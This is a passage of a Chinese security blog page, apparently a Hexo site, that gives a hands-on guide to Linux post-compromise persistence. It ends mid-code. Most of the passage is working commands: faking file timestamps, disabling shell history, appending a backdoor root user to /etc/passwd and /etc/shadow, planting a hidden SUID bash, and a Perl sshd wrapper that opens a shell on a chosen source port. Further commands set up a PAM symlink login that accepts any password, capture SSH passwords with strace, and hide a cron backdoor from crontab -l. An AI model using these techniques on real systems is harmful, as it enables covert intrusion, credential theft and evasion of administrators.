@@ -1,0 +1,1493 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Linux权限维持, PlayZG">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Linux权限维持 | PlayZG</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">PlayZG</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">PlayZG</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Linux权限维持</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-09-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.7k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="LInux权限维持"><a href="#LInux权限维持" class="headerlink" title="LInux权限维持"></a>LInux权限维持</h1><h2 id="修改文件属性"><a href="#修改文件属性" class="headerlink" title="修改文件属性"></a>修改文件属性</h2><h3 id="文件创建时间"><a href="#文件创建时间" class="headerlink" title="文件创建时间"></a>文件创建时间</h3><p>如果根据文件创建的时间来判断的话，那我们新创建的文件就会被发现</p>
+<p><code>规避方法</code></p>
+<pre class=" language-php"><code class="language-php">touch <span class="token operator">-</span>r index<span class="token punctuation">.</span>php z<span class="token punctuation">.</span>php
+touch命令可以修改文件或者目录的时间属性</code></pre>
+<h3 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h3><p><strong>chattr</strong>命令为了防止误操作删除一些重要文件，提供了一个<strong>i</strong>属性（不得任意更动文件或目录）</p>
+<p>这里用来给后门文件加上这个权限</p>
+<pre class=" language-php"><code class="language-php">chattr <span class="token operator">+</span>i z<span class="token punctuation">.</span>php     <span class="token shell-comment comment">#锁定文件</span>
+lsattr  z<span class="token punctuation">.</span>php    <span class="token shell-comment comment">#属性查看</span>
+chattr <span class="token operator">-</span>i z<span class="token punctuation">.</span>php  <span class="token shell-comment comment">#解除锁定    </span></code></pre>
+<h3 id="历史操作"><a href="#历史操作" class="headerlink" title="历史操作"></a>历史操作</h3><p>在Linux中我们执行的命令都会被记录下来，如果不想被记录可以关闭这个记录历史命令的功能</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">[</span>space<span class="token punctuation">]</span>set <span class="token operator">+</span>o history  <span class="token shell-comment comment">#备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录</span>
+<span class="token punctuation">[</span>Space<span class="token punctuation">]</span>set <span class="token operator">-</span>o history  <span class="token shell-comment comment">#将环境恢复原状    </span></code></pre>
+<h3 id="Passwd写入"><a href="#Passwd写入" class="headerlink" title="Passwd写入"></a>Passwd写入</h3><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>etc<span class="token operator">/</span>passwd 各部分含义：
+用户名：密码：用户<span class="token constant">ID</span>：组<span class="token constant">ID</span>：身份描述：用户的家目录：用户登录后所使用的<span class="token constant">SHELL</span>
+<span class="token operator">/</span>etc<span class="token operator">/</span>shadow 各部分含义：
+用户名：密码的<span class="token constant">MD5</span>加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用     </code></pre>
+<pre class=" language-php"><code class="language-php">写入的时候需要注意有没有写入权限
+perl <span class="token operator">-</span>le <span class="token string">'print crypt("123","salt")'</span>
+saEZ6MlWYV9nQ
+<span class="token keyword">echo</span> <span class="token string">"zg:saEZ6MlWYV9nQ:hack:/root:/bin/bash"</span> <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd
+<span class="token keyword">echo</span> <span class="token string">"zg:saEZ6MlWYV9nQ:-1:-1:-1:-1:-1:-1:500"</span> <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>etc<span class="token operator">/</span>shadow </code></pre>
+<h2 id="SUID后门"><a href="#SUID后门" class="headerlink" title="SUID后门"></a>SUID后门</h2><p>当一个文件所属主的x标志位s时，且所属主为root时，当执行该文件时，其实是以root身份执行的</p>
+<pre class=" language-php"><code class="language-php">查看具有<span class="token constant">SUID</span>可执行文件
+find <span class="token operator">/</span> <span class="token operator">-</span>user root <span class="token operator">-</span>perm <span class="token operator">-</span><span class="token number">4000</span> <span class="token operator">-</span><span class="token keyword">print</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span>
+find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span></code></pre>
+<p>创建SUID权限的文件</p>
+<pre class=" language-php"><code class="language-php">cp <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token punctuation">.</span>zz
+chmod u<span class="token operator">+</span>s <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token punctuation">.</span>zz
+ls <span class="token operator">-</span>al <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token punctuation">.</span>zz
+<span class="token operator">-</span>rwsr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">1</span> root root <span class="token number">690668</span> Jul <span class="token number">24</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">14</span> <span class="token punctuation">.</span>zz</code></pre>
+<h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h3><pre class=" language-php"><code class="language-php">cd <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>
+mv sshd <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bin<span class="token operator">/</span>
+
+<span class="token keyword">echo</span> <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">></span>sshd
+<span class="token keyword">echo</span> <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);'</span> <span class="token operator">></span><span class="token operator">></span>sshd   <span class="token comment" spellcheck="true">//4A是13377的小端模式</span>
+<span class="token keyword">echo</span> <span class="token string">'exec&amp;#123;"/usr/bin/sshd"&amp;#125; "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">></span><span class="token operator">></span>sshd
+chmod u<span class="token operator">+</span>x sshd
+
+<span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token punctuation">.</span>d<span class="token operator">/</span>sshd restart</code></pre>
+<p><img src="https://i.loli.net/2021/09/22/ejturUVzF3OWE4Z.png" alt="1.png"></p>
+<pre class=" language-php"><code class="language-php">socat <span class="token constant">STDIO</span> <span class="token constant">TCP4</span><span class="token punctuation">:</span>target_ip<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">,</span>sourceport<span class="token operator">=</span><span class="token number">13377</span>    <span class="token comment" spellcheck="true">//本机执行</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/22/HobFki8YdmzaJlE.png" alt="2.png"></p>
+<p>实现原理：init 首先启动的是 /usr/sbin/sshd ,脚本执行到 getpeername 这里的时候，正则匹配会失败，于是执行下一句，启动 /usr/bin/sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp 连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 /usr/sbin/sshd ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是 13377 就执行sh给个shell。</p>
+<p>优点：<br>1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。<br>2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p>
+<h3 id="软连接后门"><a href="#软连接后门" class="headerlink" title="软连接后门"></a>软连接后门</h3><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>
+<p>注意：su文件名字不能变，这个如果目标在执行软连接的时候，如果使用了其他账号创建，则登录的时候需要使用对应的账号，而非root</p>
+<pre class=" language-php"><code class="language-php">ln <span class="token operator">-</span>sf <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>sshd <span class="token operator">/</span>tmp<span class="token operator">/</span>su
+<span class="token operator">/</span>tmp<span class="token operator">/</span>su <span class="token operator">-</span>oPort<span class="token operator">=</span><span class="token number">888</span></code></pre>
+<p><strong>需要注意的是：需要关闭防火墙</strong></p>
+<pre class=" language-php"><code class="language-php">ssh root@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.11</span> <span class="token operator">-</span>p <span class="token number">8888</span>         <span class="token comment" spellcheck="true">//本机运行</span></code></pre>
+<h3 id="SSH-密钥登陆"><a href="#SSH-密钥登陆" class="headerlink" title="SSH 密钥登陆"></a>SSH 密钥登陆</h3><pre class=" language-php"><code class="language-php">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa <span class="token comment" spellcheck="true">//生成公钥</span>
+
+└─<span class="token shell-comment comment"># ssh-keygen -t rsa</span>
+Generating <span class="token keyword">public</span><span class="token operator">/</span><span class="token keyword">private</span> rsa key pair<span class="token punctuation">.</span>
+Enter file in which to save the <span class="token function">key</span> <span class="token punctuation">(</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+Enter <span class="token function">passphrase</span> <span class="token punctuation">(</span>empty <span class="token keyword">for</span> no passphrase<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+Enter same passphrase again<span class="token punctuation">:</span> 
+Your identification has been saved in <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa
+Your <span class="token keyword">public</span> key has been saved in <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">.</span>pub
+The key fingerprint is<span class="token punctuation">:</span>
+<span class="token constant">SHA256</span><span class="token punctuation">:</span>So9I24MC6TdtWQvE6u6J1jqddF3QadtTEyIgkP7020g root@Z
+The key's randomart image is<span class="token punctuation">:</span>
+<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token constant">RSA</span> <span class="token number">3072</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span>
+<span class="token operator">|</span>   <span class="token punctuation">.</span>o<span class="token punctuation">.</span> <span class="token punctuation">.</span>o<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">|</span>
+<span class="token operator">|</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">+</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>o   <span class="token operator">|</span>
+<span class="token operator">|</span>  <span class="token punctuation">.</span>  o  o o <span class="token punctuation">.</span> <span class="token punctuation">.</span>  <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span>o<span class="token punctuation">.</span>   o o     <span class="token operator">|</span>
+<span class="token operator">|</span>o  <span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span>S   <span class="token punctuation">.</span>    <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>o<span class="token punctuation">.</span>O<span class="token operator">+</span>E<span class="token punctuation">.</span>        <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">=</span>        <span class="token operator">|</span>
+<span class="token operator">|</span> o<span class="token operator">+</span><span class="token operator">=</span><span class="token operator">+</span>  <span class="token operator">+</span> <span class="token punctuation">.</span>       <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token punctuation">.</span>o<span class="token operator">++</span>             <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">[</span><span class="token constant">SHA256</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                                                                                                        
+┌──<span class="token punctuation">(</span>root💀Z<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home<span class="token operator">/</span>z<span class="token punctuation">]</span>
+└─<span class="token shell-comment comment"># cd /root/.ssh </span>
+
+┌──<span class="token punctuation">(</span>root💀Z<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token punctuation">]</span>
+└─<span class="token shell-comment comment"># ls -a</span>
+<span class="token punctuation">.</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span>  id_rsa  id_rsa<span class="token punctuation">.</span>pub  known_hosts</code></pre>
+<p>将生成的密钥拷贝到目标文件</p>
+<pre class=" language-php"><code class="language-php">rsync <span class="token operator">-</span>rP <span class="token operator">--</span>rsh<span class="token operator">=</span>ssh root@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.17</span><span class="token punctuation">:</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">.</span>pub <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span></code></pre>
+<h3 id="SSH-Keylogger记录密码"><a href="#SSH-Keylogger记录密码" class="headerlink" title="SSH Keylogger记录密码"></a>SSH Keylogger记录密码</h3><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
+<p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p>
+<pre class=" language-php"><code class="language-php">alias ssh<span class="token operator">=</span><span class="token string">'strace -o /tmp/.sshpwd-`date '</span><span class="token operator">+</span><span class="token operator">%</span>d<span class="token operator">%</span>h<span class="token operator">%</span>m<span class="token operator">%</span>s<span class="token string">'`.log -e read,write,connect -s2048 ssh'</span></code></pre>
+<p>查看记录</p>
+<p>如果登录其他服务器的话会产生对应的日志文件</p>
+<p><img src="https://i.loli.net/2021/09/23/lcOTFU82eCn54aN.png" alt="4.png"></p>
+<pre class=" language-php"><code class="language-php">grep <span class="token string">"read(4"</span> <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token punctuation">.</span>sshpwd<span class="token operator">-</span>23Sep091632385017<span class="token punctuation">.</span>log <span class="token operator">|</span> tail <span class="token operator">-</span>n <span class="token number">20</span>    <span class="token comment" spellcheck="true">//根据不同环境自行调试响应行数</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/1LjfCWmd3UsFkPt.png" alt="5.png"></p>
+<h3 id="strace监听ssh来源流量"><a href="#strace监听ssh来源流量" class="headerlink" title="strace监听ssh来源流量"></a>strace监听ssh来源流量</h3><p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
+<p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p>
+<pre class=" language-php"><code class="language-php">ps <span class="token operator">-</span>ef <span class="token operator">|</span> grep sshd    <span class="token comment" spellcheck="true">//父进程PID</span>
+strace <span class="token operator">-</span>f <span class="token operator">-</span>p <span class="token number">1111</span> <span class="token operator">-</span>o <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token punctuation">.</span>log <span class="token operator">-</span>e trace<span class="token operator">=</span>read<span class="token punctuation">,</span>write<span class="token punctuation">,</span>connect <span class="token operator">-</span>s <span class="token number">2048</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/EMrc3DhH2gquItC.png" alt="3.png"></p>
+<h2 id="Cron后门"><a href="#Cron后门" class="headerlink" title="Cron后门"></a>Cron后门</h2><p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p>
+<p>如果是执行普通的定时任务的话，管理员执行<code>crontab -l</code>就能看到定时任务，不利于隐蔽和持久化</p>
+<p>出现了相对高级的用法，下面命令执行后会显示<code>no crontab for root</code>。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示<code>no crontab for root</code>:</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span>crontab <span class="token operator">-</span>l<span class="token punctuation">;</span>printf <span class="token string">"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n"</span><span class="token punctuation">)</span><span class="token operator">|</span>crontab <span class="token operator">-</span></code></pre>
+<p><img src="https://i.loli.net/2021/09/23/t5FlWYichs6mnH9.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2021/09/23/L6OatngjC9RoPdU.png" alt="7.png"></p>
+<p>实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容:</p>
+<p>通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，但是如果目标服务器上面存在定时任务，当管理员执行<code>crontab -l</code>还是会显示<code>no crontab for root</code>，这里就是引起管理员的注意了</p>
+<p><img src="https://i.loli.net/2021/09/23/KCuFfwgA8c5HYRZ.png" alt="8.png"></p>
+<h2 id="Cat隐藏"><a href="#Cat隐藏" class="headerlink" title="Cat隐藏"></a>Cat隐藏</h2><p>cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令</p>
+<p>利用py生成一个sh的脚本</p>
+<pre class=" language-php"><code class="language-php">cmd_h <span class="token operator">=</span> <span class="token string">"echo 'You forgot to check `cat -A`!' > oops"</span> <span class="token shell-comment comment"># hidden</span>
+cmd_v <span class="token operator">=</span> <span class="token string">"echo 'Hello world!'"</span>                         <span class="token shell-comment comment"># visible</span>
+
+with <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+ output <span class="token operator">=</span> <span class="token string">"#!/bin/sh\n"</span>
+ output <span class="token operator">+</span><span class="token operator">=</span> cmd_h <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" #\r"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
